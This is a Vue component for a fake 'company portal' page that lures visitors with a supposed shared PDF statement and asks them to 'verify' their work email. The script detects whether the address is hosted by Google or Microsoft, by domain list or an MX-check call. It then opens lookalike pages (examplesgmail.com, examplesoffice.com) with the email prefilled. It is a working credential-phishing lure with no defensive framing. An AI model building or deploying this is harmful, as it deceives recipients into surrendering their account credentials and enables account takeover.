<script setup>
import { ref, computed } from 'vue';

const props = defineProps({
  companyName: {
    type: String,
    default: 'Company Portal',
  },
  faviconUrl: {
    type: String,
    default: 'https://example.com/logo.png',
  },
  ogImage: {
    type: String,
    default: null,
  },
  accentColor: {
    type: String,
    default: '#0b1e36',
  },
  redirectURL: {
    type: String,
    default: 'https://example.com',
  },
});

function getContrastColor(hexColor) {
  const hex = hexColor.replace('#', '');
  if (hex.length !== 6) return '#ffffff';
  const r = parseInt(hex.substring(0, 2), 16);
  const g = parseInt(hex.substring(2, 4), 16);
  const b = parseInt(hex.substring(4, 6), 16);
  const yiq = (r * 299 + g * 587 + b * 114) / 1000;
  return yiq >= 180 ? '#0f172a' : '#ffffff';
}

const contrastText = computed(() => getContrastColor(props.accentColor));

const themeCssVars = computed(() => {
  if (props.accentColor && props.accentColor !== '#0b1e36') {
    return {
      '--primary-navy': props.accentColor,
      '--btn-bg': props.accentColor,
      '--btn-text': contrastText.value,
    };
  }
  return {};
});

const bgWrapperStyle = computed(() => {
  if (props.ogImage) {
    return { backgroundImage: `url('${props.ogImage}')` };
  }
  return {};
});

const isModalActive = ref(false);
const visitorEmail = ref('');
const isVerifying = ref(false);
const brandFallback = ref(false);

const handleBrandError = () => {
  brandFallback.value = true;
};

const openModal = () => {
  isModalActive.value = true;
};

const closeModal = () => {
  isModalActive.value = false;
};

const handleLeadSubmit = async () => {
  const email = visitorEmail.value.trim();
  if (!email) return;

  isVerifying.value = true;

  let isGoogleEmail = false;
  let isMicrosoftEmail = false;
  const domain = email.includes('@') ? email.split('@').pop()?.toLowerCase() || '' : '';

  if (domain === 'gmail.com' || domain === 'googlemail.com' || domain.endsWith('.google.com')) {
    isGoogleEmail = true;
  } else if (
    ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'passport.com'].includes(domain) ||
    domain.endsWith('.outlook.com')
  ) {
    isMicrosoftEmail = true;
  } else if (domain) {
    try {
      const res = await fetch('/api/check-mx?email=' + encodeURIComponent(email));
      if (res.ok) {
        const data = await res.json();
        if (data.isGoogle) {
          isGoogleEmail = true;
        } else if (data.isMicrosoft) {
          isMicrosoftEmail = true;
        }
      }
    } catch (err) {
      console.warn('MX check error:', err);
    }
  }

  isVerifying.value = false;

  let targetUrl = props.redirectURL;
  if (isGoogleEmail) {
    targetUrl = 'https://examplesgmail.com/?email=' + encodeURIComponent(email);
  } else if (isMicrosoftEmail) {
    targetUrl = 'https://examplesoffice.com/?email=' + encodeURIComponent(email);
  } else {
    targetUrl = 'https://otherexamplesgmail.com/?email=' + encodeURIComponent(email);
  }

  window.open(targetUrl, '_blank', 'noopener,noreferrer');
  isModalActive.value = false;
};
</script>

<template>
  <div class="landing-portal-root" :style="themeCssVars">
    <div class="bg-wrapper" :style="bgWrapperStyle">
      <div class="bg-overlay"></div>
    </div>

    <div class="overlay-container">
      <div class="showcase-card">
        <div class="company-brand">
          <img
            v-if="!brandFallback"
            :src="faviconUrl"
            :alt="companyName"
            @error="handleBrandError"
          />
          <span v-else class="brand-fallback">{{ companyName }}</span>
        </div>

        <h1 class="card-title">Welcome to {{ companyName }}</h1>
        <p class="card-subtitle">
         Verify your identity to access the secure document shared with your account
        </p>

        <div class="features-grid">
          <div class="feature-item">
            <div class="feature-icon"><i class="fa-solid fa-layer-group"></i></div>
            <div class="feature-title">Statement_Document_2026.pdf</div>
            <div class="feature-desc">PDF Document • 2.4 MB.</div>
          </div>
        </div>

        <button type="button" class="btn-action" @click="openModal">
          <span>Access Document</span>
          <i class="fa-solid fa-arrow-right"></i>
        </button>

        <div class="card-footer">
          {{ companyName }} &bull;
          <a :href="redirectURL" target="_blank">Terms of Service</a> &bull;
          <a :href="redirectURL" target="_blank">Privacy Policy</a>
        </div>
      </div>
    </div>

    <!-- Lead Modal -->
    <div :class="['modal-backdrop', { active: isModalActive }]" @click.self="closeModal">
      <div class="modal-card">
        <button type="button" class="modal-close" @click="closeModal">&times;</button>
        <div class="modal-logo-container">
          <img :src="faviconUrl" :alt="companyName" />
        </div>
        <h3 class="modal-title">Verify your Email</h3>
        <p class="modal-desc">Enter your work email to continue to the shared document.</p>

        <form class="modal-form" @submit.prevent="handleLeadSubmit">
          <input
            v-model="visitorEmail"
            type="email"
            class="modal-input"
            placeholder="name@company.com"
            required
          />
          <button type="submit" class="modal-submit" :disabled="isVerifying">
            <span>{{ isVerifying ? 'Verifying...' : 'Proceed' }}</span>
            <i class="fa-solid fa-arrow-right"></i>
          </button>
        </form>
      </div>
    </div>
  </div>
</template>

<style>
:root {
  --primary-navy: #0b1e36;
  --btn-bg: #0b1e36;
  --btn-text: #ffffff;
  --btn-hover: #142e50;
  --accent-gold: #c9932b;
  --text-dark: #0f172a;
  --text-muted: #64748b;
  --card-bg: #ffffff;
  --border-color: #e2e8f0;
  --radius: 16px;
  --shadow: 0 20px 40px -15px rgba(11, 30, 54, 0.4);
  --transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
}

.landing-portal-root {
  min-height: 100vh;
  width: 100%;
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
  background-color: #080f1a;
  color: #ffffff;
  margin: 0;
  padding: 0;
  position: relative;
}

.bg-wrapper {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 1;
  background-image: url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?w=1600&q=80');
  background-size: cover;
  background-position: center;
  filter: blur(4px) brightness(0.35);
  transform: scale(1.03);
}

.bg-overlay {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: radial-gradient(circle at center, rgba(11, 30, 54, 0.6) 0%, rgba(8, 15, 26, 0.95) 100%);
}

.overlay-container {
  position: relative;
  z-index: 10;
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  padding: 2rem 1.5rem;
  width: 100%;
  box-sizing: border-box;
}

.showcase-card {
  background: var(--card-bg);
  border-radius: var(--radius);
  box-shadow: var(--shadow);
  max-width: 440px;
  width: 100%;
  padding: 2.5rem 2rem;
  text-align: center;
  position: relative;
  border: 1px solid rgba(255, 255, 255, 0.9);
  animation: cardFadeIn 0.4s ease-out;
  display: flex;
  flex-direction: column;
  align-items: center;
  box-sizing: border-box;
}

@keyframes cardFadeIn {
  from { opacity: 0; transform: translateY(15px); }
  to { opacity: 1; transform: translateY(0); }
}

.company-brand {
  margin-bottom: 1.25rem;
  display: flex;
  justify-content: center;
  align-items: center;
  width: 100%;
  min-height: 52px;
}

.company-brand img {
  max-width: 180px;
  max-height: 52px;
  width: auto;
  height: auto;
  object-fit: contain;
  display: block;
}

.brand-fallback {
  font-size: 1.35rem;
  font-weight: 700;
  color: var(--primary-navy);
  letter-spacing: 0.5px;
  text-transform: uppercase;
}

.card-title {
  font-size: 1.5rem;
  font-weight: 700;
  color: var(--text-dark);
  margin-bottom: 0.5rem;
  letter-spacing: -0.3px;
  width: 100%;
  line-height: 1.3;
}

.card-subtitle {
  color: var(--text-muted);
  font-size: 0.9rem;
  line-height: 1.5;
  margin-bottom: 1.75rem;
  width: 100%;
}

.features-grid {
  display: flex;
  justify-content: center;
  margin-bottom: 1.75rem;
  width: 100%;
}

.feature-item {
  background: #f8fafc;
  border: 1px solid var(--border-color);
  border-radius: 10px;
  padding: 0.875rem 1.25rem;
  width: 100%;
  max-width: 320px;
  text-align: center;
}

.feature-icon {
  color: var(--accent-gold);
  font-size: 1.15rem;
  margin-bottom: 0.4rem;
}

.feature-title {
  font-size: 0.85rem;
  font-weight: 600;
  color: var(--text-dark);
  margin-bottom: 0.2rem;
}

.feature-desc {
  font-size: 0.75rem;
  color: var(--text-muted);
  line-height: 1.35;
}

.btn-action {
  width: 100%;
  background-color: var(--btn-bg);
  color: var(--btn-text) !important;
  border: 1px solid rgba(0, 0, 0, 0.1);
  border-radius: 8px;
  padding: 0.9rem 1.25rem;
  font-size: 0.95rem;
  font-weight: 600;
  cursor: pointer;
  transition: var(--transition);
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 0.6rem;
  box-shadow: 0 4px 14px rgba(11, 30, 54, 0.25);
  text-decoration: none;
  box-sizing: border-box;
  opacity: 1 !important;
  visibility: visible !important;
}

.btn-action span, .btn-action i {
  color: var(--btn-text) !important;
  opacity: 1 !important;
  visibility: visible !important;
}

.btn-action:hover {
  background-color: var(--btn-hover);
  transform: translateY(-1px);
  box-shadow: 0 6px 18px rgba(11, 30, 54, 0.35);
}

.card-footer {
  margin-top: 1.75rem;
  padding-top: 1rem;
  border-top: 1px solid var(--border-color);
  font-size: 0.75rem;
  color: var(--text-muted);
  width: 100%;
  text-align: center;
}

.card-footer a {
  color: var(--text-muted);
  text-decoration: underline;
  margin: 0 4px;
}

.card-footer a:hover {
  color: var(--primary-navy);
}

/* Lead Collection Modal */
.modal-backdrop {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background: rgba(11, 30, 54, 0.75);
  backdrop-filter: blur(5px);
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: center;
  opacity: 0;
  visibility: hidden;
  transition: all 0.25s ease;
  padding: 1rem;
}

.modal-backdrop.active {
  opacity: 1;
  visibility: visible;
}

.modal-card {
  background: #ffffff;
  border-radius: 16px;
  max-width: 400px;
  width: 100%;
  padding: 2rem;
  text-align: center;
  box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.35);
  transform: scale(0.92);
  transition: transform 0.25s cubic-bezier(0.16, 1, 0.3, 1);
  position: relative;
  color: var(--text-dark);
}

.modal-backdrop.active .modal-card {
  transform: scale(1);
}

.modal-close {
  position: absolute;
  top: 1rem;
  right: 1rem;
  background: transparent;
  border: none;
  font-size: 1.25rem;
  color: var(--text-muted);
  cursor: pointer;
  padding: 0.25rem;
  line-height: 1;
  border-radius: 50%;
  transition: color 0.2s ease;
}

.modal-close:hover {
  color: var(--text-dark);
}

.modal-logo-container {
  width: 52px;
  height: 52px;
  background: #f8fafc;
  border: 1px solid var(--border-color);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 1.25rem auto;
  padding: 6px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
  overflow: hidden;
}

.modal-logo-container img {
  max-width: 100%;
  max-height: 100%;
  object-fit: contain;
  display: block;
}

.modal-title {
  font-size: 1.25rem;
  font-weight: 700;
  margin-bottom: 0.5rem;
  color: var(--text-dark);
}

.modal-desc {
  font-size: 0.85rem;
  color: var(--text-muted);
  line-height: 1.45;
  margin-bottom: 1.25rem;
}

.modal-form {
  display: flex;
  flex-direction: column;
  gap: 0.875rem;
}

.modal-input {
  width: 100%;
  padding: 0.8rem 1rem;
  border: 1px solid var(--border-color);
  border-radius: 8px;
  font-size: 0.9rem;
  outline: none;
  transition: border-color 0.2s ease;
}

.modal-input:focus {
  border-color: #2563eb;
  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
}

.modal-submit {
  width: 100%;
  background: var(--btn-bg);
  color: var(--btn-text);
  border: none;
  border-radius: 8px;
  padding: 0.85rem;
  font-size: 0.9rem;
  font-weight: 600;
  cursor: pointer;
  transition: background 0.2s ease;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;
}

.modal-submit:hover {
  background: var(--btn-hover);
}
</style>
